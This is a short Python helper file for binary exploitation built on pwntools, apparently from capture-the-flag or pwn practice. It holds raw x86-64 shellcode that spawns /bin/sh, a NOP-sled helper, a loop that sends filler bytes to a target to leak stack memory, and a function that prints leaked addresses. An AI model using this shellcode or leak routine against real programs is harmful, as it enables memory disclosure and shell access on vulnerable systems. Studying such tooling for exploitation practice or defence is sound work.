from pwn import *

shellcode = b"\xEB\x10\x5F\x48\xC7\xC0\x3B\x00\x00\x00\x48\x31\xF6\x48\x31\xD2\x0F\x05\xE8\xEB\xFF\xFF\xFF/bin/sh\0"

def nop_padding(size):
    return b"\x90" * size


'''
    Useful for loop reads where we can leak the stack
    make sure that max_returned_bytes is <= the max amount of bytes the program can send
    pre_leak_consumer(int) is a function that consumes what the program returned and returns only the leaked bytes given the max_returned_bytes and filler size 
'''
def leak_bytes(r, max_returned_bytes, start_offset, pre_leak_consumer, fill_byte = b'A', debug = False):
    current_filler = start_offset
    acc_len = 0
    acc = b''
    while acc_len < max_returned_bytes:
        filler = b'A' * current_filler
        r.send(filler)
        newly_leaked = pre_leak_consumer(max_returned_bytes, current_filler)
        leaked_bytes = len(newly_leaked)	
        if leaked_bytes != 0:
            acc += newly_leaked
            acc_len += leaked_bytes
            current_filler += leaked_bytes
        else:
            acc += b'\x00'
            acc_len += 1
            current_filler += 1
        if(debug):
            input("Received leak")
            print(leaked_bytes)
            print(newly_leaked)
            print(acc_len)
            print(acc)
    return acc

def print_packed(data, pack_size, min_to_print = 0x0):
    assert pack_size == 4 or pack_size == 8
    address = 0
    data_len = len(data)
    for i in range(0, data_len, pack_size):
        if(i + pack_size > data_len): 
            print(b"Trailing: " + data[i:data_len])
            break
        if(pack_size == 4):
            address = u32(data[i:i+pack_size])
        else:
            address = u64(data[i:i+pack_size])
        if address > 0x0:
            print(hex(address))
